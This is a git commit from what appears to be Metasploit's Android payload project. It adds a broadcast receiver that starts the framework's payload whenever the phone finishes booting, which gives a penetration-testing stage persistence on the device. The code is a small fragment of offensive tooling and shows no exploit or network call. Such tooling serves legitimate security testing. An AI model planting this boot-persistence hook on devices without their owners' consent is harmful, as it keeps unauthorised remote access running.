0cc7a3ac9481e95104c90da3acd4a9332e125a57
Tim <timrlw@gmail.com>
2015-11-13 07:51:21 +0000

    add BOOT_COMPLETED receiver that starts the Payload

---
+++ java/androidpayload/app/src/com/metasploit/stage/MainBroadcastReceiver.java
@@ -0,0 +1,15 @@
+package com.metasploit.stage;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+
+public class MainBroadcastReceiver extends BroadcastReceiver {
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
+            Payload.start(context);
+        }
+    }
+}
